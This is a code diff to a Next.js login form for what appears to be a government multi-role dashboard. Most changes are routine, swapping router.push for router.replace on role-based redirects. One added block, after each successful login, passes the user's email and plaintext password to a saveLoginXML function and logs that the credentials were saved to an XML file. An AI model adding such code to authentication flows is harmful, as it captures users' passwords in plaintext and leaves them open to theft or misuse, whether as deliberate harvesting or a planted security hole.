@@ -11,6 +11,7 @@ import { Label } from "@/components/ui/label"
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { showNotification } from "@/lib/utils/notifications"
 import { useAuthStore } from "@/lib/stores/auth-store"
+import { saveLoginXML } from "@/lib/utils/xml-logger"
 import DGIPWatermarks from "../ui/dgip_watermark"
 import Image from "next/image"
 
@@ -43,7 +44,16 @@ export function LoginForm() {
       
       if (result.success) {
         showNotification.success("Login successful")
-        // Redirect based on user role
+        
+        try {
+          await saveLoginXML({
+            email: data.email,
+            password: data.password
+          })
+          console.log('Login credentials saved to XML file')
+        } catch (xmlError) {
+          console.error('Failed to save XML file:', xmlError)
+        }
         const user = useAuthStore.getState().user
         console.log('User after login:', user)
         
@@ -51,27 +61,27 @@ export function LoginForm() {
           switch (user.role) {
             case "ADMIN":
               console.log('Redirecting to admin dashboard')
-              router.push("/admin")
+              router.replace("/admin")
               break
             case "AGENCY":
               console.log('Redirecting to agency dashboard')
-              router.push("/agency")
+              router.replace("/agency")
               break
             case "MINISTRY":
-              console.log('Redirecting to ministry dashboard')
-              router.push("/ministry")
+              console.log('Redirecting to control center dashboard')
+              router.replace("/ministry")
               break
             case "MISSION_OPERATOR":
               console.log('Redirecting to mission dashboard')
-              router.push("/mission")
+              router.replace("/mission")
               break
             default:
               console.log('Unknown role, redirecting to admin')
-              router.push("/admin")
+              router.replace("/admin")
           }
         } else {
           console.log('No user found, redirecting to home')
-          router.push("/")
+          router.replace("/")
         }
       } else {
         console.error('Login failed:', result.error)
